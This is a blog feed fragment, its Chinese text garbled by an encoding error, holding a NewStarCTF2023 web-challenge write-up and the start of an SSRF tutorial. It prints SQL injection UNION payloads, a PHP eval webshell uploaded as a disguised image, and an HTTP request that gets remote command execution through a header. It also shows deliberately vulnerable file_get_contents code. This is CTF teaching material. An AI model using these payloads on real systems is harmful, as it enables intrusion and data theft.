hbe-input-label-content-default">æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023</title>
      <link href="/2023/10/02/NewStarCTF2023/"/>
      <url>/2023/10/02/NewStarCTF2023/</url>
      
        <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="1-æ³„æ¼çš„ç§˜å¯†"><a href="#1-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="1.æ³„æ¼çš„ç§˜å¯†"></a>1.æ³„æ¼çš„ç§˜å¯†</h3><p><strong>é¢˜ç›®æè¿°</strong>ï¼šç²—å¿ƒçš„ç½‘ç«™ç®¡ç†å‘˜æ€»ä¼šæ³„æ¼ä¸€äº›æ•æ„Ÿä¿¡æ¯åœ¨Webæ ¹ç›®å½•ä¸‹</p><p><strong>æœ¬é¢˜è€ƒç‚¹</strong>ï¼šä¿¡æ¯æ³„éœ²çš„ä¸€äº›æ•æ„Ÿç›®å½•ï¼Œdirsearchæ‰«æå™¨çš„ä½¿ç”¨ï¼Œæœ‰æ—¶å€™ç½‘ç»œåŸå› ï¼Œå¯èƒ½æ‰«æå™¨æ‰«ä¸å‡ºæ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¸€äº›å¸¸è§çš„æ•æ„Ÿç›®å½•ã€‚</p><p><strong>è§£é¢˜æ€è·¯</strong>ï¼šå…ˆå°è¯•ç”¨æ‰«æå™¨æ‰«ä¸€ä¸‹ï¼Œå¦‚æœç½‘ç»œæœ‰é—®é¢˜å»ºè®®è‡ªå·±çŒœä¸€ä¸‹</p><p><a href="http://www.zipè¿™ä¸ªå¯ä»¥ä¸‹è½½/">www.zipè¿™ä¸ªå¯ä»¥ä¸‹è½½</a></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231012110528395.png" alt="image-20231012110528395"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="1-æ¸¸æˆé«˜æ‰‹"><a href="#1-æ¸¸æˆé«˜æ‰‹" class="headerlink" title="1.æ¸¸æˆé«˜æ‰‹"></a>1.æ¸¸æˆé«˜æ‰‹</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong>å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ</p><p><strong>æœ¬é¢˜è€ƒç‚¹</strong>ï¼šjsonæ ¼å¼å‘é€æ•°æ®</p><p><strong>è§£é¢˜æ€è·¯ï¼š</strong>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯å°æ¸¸æˆï¼Œè¿™ç±»é¢˜ç›®ä¸€ç‰ˆçœ‹å‰ç«¯ä»£ç ï¼Œjsä»£ç éƒ¨åˆ†ç‰¹åˆ«é‡è¦</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231009200126674.png" alt="image-20231009200126674"></p><p>ç†è§£æ¸¸æˆç»“æŸçš„æ¡ä»¶ï¼Œè·å¾—åˆ†æ•°å¤§äº100000æ—¶ï¼Œä¼šå¾€/api.phpå‘é€jsonæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±å‘é€å°±å¯ä»¥å¾—åˆ°flag</p><blockquote><p><strong>jsonæ•°æ®æ ¼å¼ï¼š</strong></p><p>1.<strong>æ•°æ®ç±»å‹</strong>ï¼šjsonæ”¯æŒä»¥ä¸‹å‡ ç§æ•°æ®ç±»å‹</p><ul><li><strong>å­—ç¬¦ä¸²</strong>(String):å¿…é¡»åŒ…å«åœ¨åŒå¼•å·ä¸­ï¼Œegï¼šâ€œHello worldâ€</li><li><strong>æ•°å­—</strong>(number):å¯ä»¥æ˜¯æ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼Œä¸éœ€è¦å¼•å¯¼ï¼Œegï¼š45æˆ–5.20</li><li><strong>å¸ƒå°”å€¼</strong>(boolean):trueæˆ–false</li><li><strong>ç©ºå€¼</strong>(null):è¡¨ç¤ºç¼ºå°‘å€¼çš„ç‰¹æ®Šå…³é”®å­—ï¼Œä¸éœ€è¦å¼•å·ï¼Œegï¼šnull</li><li><strong>å¯¹è±¡</strong>(object):ç”¨èŠ±æ‹¬å·{}è¡¨ç¤ºï¼ŒåŒ…å«é”®å€¼å¯¹ï¼Œegï¼š{â€œnameâ€:â€Aliceâ€,â€ageâ€:â€18â€}</li><li><strong>æ•°ç»„</strong>(Array):ç”¨æ–¹æ‹¬å·[]è¡¨ç¤ºï¼ŒåŒ…å«å¤šä¸ªå€¼ï¼Œeg[1,2,3]</li></ul><p>2.<strong>é”®å€¼å¯¹</strong>ï¼šJSONå¯¹è±¡ç”±ä¸€ç»„é”®å€¼å¯¹ç»„æˆï¼Œé”®å’Œå€¼ä¹‹é—´ä½¿ç”¨å†’å·åˆ†éš”ï¼Œé”®å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œå€¼å¯ä»¥æ˜¯ä»»ä½•åˆæ³•çš„JSONæ•°æ®ç±»å‹ã€‚ä¾‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>â€œnameâ€<span class="punctuation">:</span><span class="string">&quot;Alice&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="string">&quot;18&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>3**.æ•°ç»„ï¼š**JSONæ•°ç»„æ˜¯æœ‰åºçš„å€¼åˆ—è¡¨ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªå€¼ï¼Œç”¨é€—å·åˆ†éš”ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1,2,3,&quot;apple&quot;,&quot;age&quot;,true]</span><br></pre></td></tr></table></figure><p>4.<strong>åµŒå¥—ï¼š</strong>å¯ä»¥åµŒå¥—jsonå¯¹è±¡å’Œæ•°ç»„ï¼Œä»¥åˆ›å»ºå¤æ‚çš„æ•°æ®ç»“æ„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    â€œpersonâ€<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Bob&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;hobbies&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;raeding&quot;</span><span class="punctuation">,</span><span class="string">&quot;swimming&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>5.<strong>æ ¼å¼åŒ–ï¼š</strong>jsoné€šå¸¸ä½¿ç”¨ç¼©è¿›æ¥è¿›è¡Œæ ¼å¼åŒ–ï¼Œä»¥å¢åŠ å¯è¯»æ€§ï¼Œä½†æ˜¯åœ¨ä¼ è¾“æ•°æ®æ—¶ï¼Œé€šå¸¸ä¼šå°†å…¶å‹ç¼©æˆä¸€è¡Œã€‚</p><p>6.<strong>æ³¨é‡Šï¼š</strong>JSONä¸æ”¯æŒæ³¨é‡Šï¼Œä¸èƒ½åœ¨JSONæ•°æ®ä¸­æ·»åŠ æ³¨é‡Šã€‚</p><p>7.<strong>å­—ç¬¦è½¬ä¹‰ï¼š</strong>æŸäº›ç‰¹æ®Šå­—ç¬¦éœ€è¦è¿›è¡Œè½¬ä¹‰ï¼Œä¾‹å¦‚åŒå¼•å·å†…çš„åŒå¼•å·éœ€è¦è½¬ä¹‰ä¸º <code>\&quot;</code>ã€‚</p></blockquote><p>åˆ†æä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//æ¸¸æˆç»“æŸ</span><br><span class="line">function gameover()&#123;</span><br><span class="line">    if(gameScore &gt; 100000)&#123;</span><br><span class="line">        var xhr = new XMLHttpRequest();</span><br><span class="line">        xhr.open(&quot;POST&quot;, &quot;/api.php&quot;, true);</span><br><span class="line">        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;);</span><br><span class="line">        xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line">            var response = JSON.parse(xhr.responseText);</span><br><span class="line">            alert(response.message);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        var data = &#123;</span><br><span class="line">            score: gameScore,</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.send(JSON.stringify(data));</span><br><span class="line">    &#125;</span><br><span class="line">alert(&quot;æˆç»©ï¼š&quot;+gameScore);</span><br><span class="line">gameScore=0;  </span><br><span class="line">curPhase =PHASE_READY;  </span><br><span class="line">hero = null;</span><br><span class="line">hero = new Hero();      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/02/NewStarCTF2023/image-20231009210507663.png" alt="image-20231009210507663"></p><h3 id="2-include-0ã€‚0"><a href="#2-include-0ã€‚0" class="headerlink" title="2.include 0ã€‚0"></a>2.include 0ã€‚0</h3><p>é¢˜ç›®æè¿°ï¼šåŒ…å«ä¹Ÿæœ‰å±å®³ï¼Ÿ</p><p>è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ï¼Œä¼ªåè®®ä½¿ç”¨</p><p>è§£é¢˜æ€è·¯ï¼šæ‰“å¼€é¢˜ç›®</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231009211900530.png" alt="image-20231009211900530"></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231009223752593.png" alt="image-20231009223752593"></p><p>å·¥å…·é“¾æ¥ï¼š<a href="https://www.novel.tools/decode/UTF-7">https://www.novel.tools/decode/UTF-7</a></p><p>+ADw?php //flag+AHs-66adb341-a380-47cd-a67e-8ecd265e7722+AH0</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231009223850727.png" alt="image-20231009223850727"></p><h3 id="3-ez-sql"><a href="#3-ez-sql" class="headerlink" title="3.ez_sql"></a>3.ez_sql</h3><p>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231010211720456.png" alt="image-20231010211720456"></p><p>2.åˆ¤æ–­å­—æ®µæ•°</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231010212056308.png" alt="image-20231010212056308"></p><p>3.å­—æ®µæ•°ä¸º5</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231010212542891.png" alt="image-20231010212542891"></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231010212613190.png" alt="image-20231010212613190"></p><p>4.æŸ¥çœ‹è¡¨å</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231010215816271.png" alt="image-20231010215816271"></p><p>5.æŸ¥å­—æ®µå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; UNION SELECT (SELECT group_concat(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=â€˜here_is_flagâ€™),2,3,4,5--+</span><br></pre></td></tr></table></figure><p>6.</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231010222214202.png" alt="image-20231010222214202"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; UNION SELECT (SELECT * FROM here_is_flag),2,3,4,5--+</span><br></pre></td></tr></table></figure><img src="/2023/10/02/NewStarCTF2023/image-20231010231159871.png" alt="image-20231010231159871" style="zoom:150%;"><h3 id="4-Unserializeï¼Ÿ"><a href="#4-Unserializeï¼Ÿ" class="headerlink" title="4.Unserializeï¼Ÿ"></a>4.Unserializeï¼Ÿ</h3><p><img src="/2023/10/02/NewStarCTF2023/image-20231011164128544.png" alt="image-20231011164128544"></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231011164048260.png" alt="image-20231011164048260"></p><h3 id="5-Upload-again"><a href="#5-Upload-again" class="headerlink" title="5.Upload again!"></a>5.Upload again!</h3><p>è¿™ä¸ªé¢˜çš„è¯å¥½åƒæ˜¯å¯¹&lt;?php&gt;è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ä¸Šä¼ çš„æœ¨é©¬ï¼Œ</p><p><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;/script&gt;</code></p><p>.phpåç¼€çš„æ–‡ä»¶åä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯•è¯•ä¸Šä¼ å›¾ç‰‡é©¬.jpg/.pngæ ¼å¼çš„å›¾ç‰‡é©¬</p><p><img src="/2023/10/02/NewStarCTF2023/image-20231011201534207.png" alt="image-20231011201534207"></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231011201632614.png" alt="image-20231011201632614"></p><h3 id="6-R-C-E"><a href="#6-R-C-E" class="headerlink" title="6.R!!C!!E!!"></a>6.R!!C!!E!!</h3><p>é¢˜ç›®æè¿°:R!!C!!E!!M!!E!!</p><p>é¢˜ç›®è€ƒç‚¹ï¼šgitæ³„éœ²</p><p>é¦–å…ˆçœ‹åˆ°æç¤ºæœ‰ä¿¡æ¯æ³„éœ²ï¼Œå¯ä»¥ä½¿ç”¨dirsearchæ‰«ï¼Œæ‰«å‡ºäº† /.git ï¼Œä½¿ç”¨GitHackå·¥å…·è·å–æºç ã€‚æ‰«å‡ºindex.phpï¼Œå°±æ˜¯ä¸»é¡µçš„æºç ï¼Œæ²¡æœ‰æœ‰æ•ˆä¿¡æ¯ï¼Œè¿˜æœ‰ä¸€ä¸ªbo0g1pop.php ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHack.py http://d2233de0-9159-4945-b37e-66ee7190d872.node4.buuoj.cn:81/.git</span><br></pre></td></tr></table></figure><p><img src="/2023/10/02/NewStarCTF2023/image-20231012104743836.png" alt="image-20231012104743836"></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231012104829509.png" alt="image-20231012104829509"></p><p>ç¬¬ä¸€ä¸ªæ­£åˆ™å¯¹æäº¤çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼šä»»æ„å­—ç¬¦åŠ ä¸Šå¯é€‰çš„æ‹¬å·ï¼ˆå…è®¸åµŒå¥—ï¼‰æ›´æ¢ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äºåˆ†å·ï¼Œç»“åˆä¸‹é¢çš„ eval å¯ä»¥çŸ¥é“å°±æ˜¯æ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚</p><p>ç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ç”¨äºæ— å‚æ•°å‘½ä»¤æ‰§è¡Œçš„ php æ–¹æ³•ï¼Œä½†è¿‡æ»¤ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼åŠŸèƒ½çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1</span><br><span class="line">Host: d2233de0-9159-4945-b37e-66ee7190d872.node4.buuoj.cn:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarder-Proto: system(&#x27;cat /f*&#x27;);</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="/2023/10/02/NewStarCTF2023/image-20231012105342395.png" alt="image-20231012105342395"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="1-Include-ğŸ"><a href="#1-Include-ğŸ" class="headerlink" title="1.Include ğŸ"></a>1.Include ğŸ</h3><p>é¢˜ç›®æè¿°ï¼šLFI to RCE</p><p>é¢˜ç›®è€ƒç‚¹ï¼šPHP pearcmdæ–‡ä»¶åŒ…å«</p><p>æ‰“å¼€é¢˜ç›®çœ‹phpæºç ï¼Œå®ƒæŠŠphpæ–‡ä»¶åŒ…å«çš„ä¼ªåè®®å’Œsessionæ–‡ä»¶ã€logæ–‡ä»¶éƒ½ç”¨æ­£åˆ™åŒ¹é…æ‰äº†ï¼Œæœ‰ä¸€ä¸ªæç¤º<code>Something in phpinfo.php!</code></p><p><img src="/2023/10/02/NewStarCTF2023/image-20231019192332870.png" alt="image-20231019192332870"></p><p>è¿™ä¸ªé¢˜çš„è€ƒç‚¹</p><h4 id="pearcmdè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#pearcmdè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="pearcmdè¿›è¡Œæ–‡ä»¶åŒ…å«"></a><strong>pearcmdè¿›è¡Œæ–‡ä»¶åŒ…å«</strong></h4><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>php.iniä¸­register_argc_argv=on å¼€å¯çŠ¶æ€</li><li>å®‰è£…äº†pearæ‰©å±•</li></ul><p>åŸç†</p><p>pearè¿™ä¸ªå·¥å…·å…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œé»˜è®¤å®‰è£…è·¯å¾„</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrfæ¼æ´</title>
      <link href="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="01ssrfæ¦‚å¿µ"><a href="#01ssrfæ¦‚å¿µ" class="headerlink" title="01ssrfæ¦‚å¿µ"></a>01ssrfæ¦‚å¿µ</h2><p><strong>SSRF</strong>ï¼ˆSsscerver Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹</p><p>ssrfæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p><h2 id="02SSRFçš„åŸç†"><a href="#02SSRFçš„åŸç†" class="headerlink" title="02SSRFçš„åŸç†"></a>02SSRFçš„åŸç†</h2><p>ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†æ²¡æœ‰å¯¹åœ°å€å’Œåè®®ç­‰åšè¿‡æ»¤å’Œé™åˆ¶ã€‚ä½¿å¾—æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†ï¼Œæ”»å‡»å…¶è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><blockquote><p>ä»£ç å®¡è®¡ä¸­å¦‚ä½•å‘ç°ï¼šçœ‹åˆ°fsockopenæ–¹æ³•å°±è¦æ³¨æ„ï¼Œä¸€èˆ¬éƒ½æœ‰ä¸‰ä¸ªå‚æ•°ï¼šhostï¼Œportï¼Œlinkï¼Œç‰¹åˆ«æ³¨æ„linkèƒ½æ§åˆ¶çš„æƒ…å†µä¸‹å°±è¦ç‰¹åˆ«æ³¨æ„ã€‚</p></blockquote><h2 id="03ssrfçš„ä¸»è¦æ”»å‡»æ–¹å¼"><a href="#03ssrfçš„ä¸»è¦æ”»å‡»æ–¹å¼" class="headerlink" title="03ssrfçš„ä¸»è¦æ”»å‡»æ–¹å¼"></a>03ssrfçš„ä¸»è¦æ”»å‡»æ–¹å¼</h2><p>æ”»å‡»è€…æƒ³è¦è®¿é—®ä¸»æœºBä¸Šçš„æœåŠ¡ï¼Œä½†æ˜¯<code>ç”±äºå­˜åœ¨é˜²ç«å¢™æˆ–è€…ä¸»æœºBæ˜¯å±äºå†…ç½‘ä¸»æœºç­‰åŸå› å¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ä¸»æœºB</code>ã€‚è€ŒæœåŠ¡å™¨Aå­˜åœ¨</p><p>SSRFæ¼æ´ï¼Œè¿™æ—¶æ”»å‡»è€…å¯ä»¥å€ŸåŠ©æœåŠ¡å™¨Aæ¥å‘èµ·SSRFæ”»å‡»ï¼Œé€šè¿‡æœåŠ¡å™¨Aå‘ä¸»æœºBå‘èµ·è¯·æ±‚ï¼Œä»è€Œè·å–ä¸»æœºBçš„ä¸€äº›ä¿¡æ¯ã€‚</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230902103448660.png" alt="image-20230902103448660"></p><h2 id="04ssrfå±å®³"><a href="#04ssrfå±å®³" class="headerlink" title="04ssrfå±å®³"></a>04ssrfå±å®³</h2><p>1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯</p><p>2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–è€…æœ¬åœ°è¿è¡Œçš„åº”ç”¨ç¨‹åº</p><p>3.å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯</p><p>4.æ”»å‡»å†…ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨GETå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚Struts2æ¼æ´</p><p>åˆ©ç”¨ï¼ŒSQLæ³¨å…¥ç­‰</p><p>5.åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ•æ„Ÿæ•°æ®æ–‡ä»¶ç­‰</p><h2 id="05æ¼æ´äº§ç”Ÿçš„å‡½æ•°"><a href="#05æ¼æ´äº§ç”Ÿçš„å‡½æ•°" class="headerlink" title="05æ¼æ´äº§ç”Ÿçš„å‡½æ•°"></a>05æ¼æ´äº§ç”Ÿçš„å‡½æ•°</h2><h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents()"></a>1.file_get_contents()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;                          <span class="comment">//åˆ¤æ–­ä¼ è¿›æ¥çš„urlæ˜¯ä¸æ˜¯ç©º,ä¸æ˜¯ç©ºåˆ™æ˜¯true</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);     <span class="comment">//ä½¿ç”¨file_get_contentså¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶åå†…å®¹è¯»å…¥åˆ°å­—ç¬¦ä¸²ä¸­èµ‹ç»™$content</span></span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;img1.jpg&#x27;</span>;                          <span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºimg1.jpgçš„å›¾ç‰‡filenameå˜é‡</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);            <span class="comment">//å°†$contentè¯»å…¥çš„æ–‡ä»¶å†…å®¹å†™å…¥åˆ°$filenameå›¾ç‰‡é‡Œ</span></span><br><span class="line"><span class="comment">//echo $_POST[&#x27;url&#x27;];</span></span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt; img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;             <span class="comment">//ä½¿ç”¨imgæ ‡ç­¾å¯¹å›¾ç‰‡è¿›è¡Œè·¯å¾„æ‹¼æ¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;                                          <span class="comment">//æ‰“å°å›¾ç‰‡è·¯å¾„</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>file_get_contents</code>å‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å†…å®¹ï¼Œç„¶åæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åè¿›è¡Œä¿å­˜ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚<code>file_put_content</code>å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p><p><strong>æ³¨æ„:ä½¿ç”¨file_get_contentsè¯»å–æ–‡ä»¶ä¸€å®šè¦åŠ ä¸Šåè®®(http://)</strong></p></blockquote><p>å¯ä»¥åœ¨åˆ©ç”¨php</p><p>åŸºç¡€ç»ƒä¹ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123; <span class="comment">//å¦‚æœurlå‚æ•°ä¸­å­˜åœ¨&#x27;url&#x27;è¿™ä¸ªé”®</span></span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); <span class="comment">//ä»urlè·å–å†…å®¹</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;img1.jpg&#x27;</span>; <span class="comment">//è®¾ç½®æ–‡ä»¶å</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);<span class="comment">//å°†å†…å®¹å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//echo $_POST[&#x27;url&#x27;];</span></span><br><span class="line"><span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;<span class="comment">//è®¾ç½®imgæ ‡ç­¾çš„srcå±æ€§ä¸ºæ–‡ä»¶å</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; <span class="comment">//shu&#x27;c</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-fsockopen-å‡½æ•°"><a 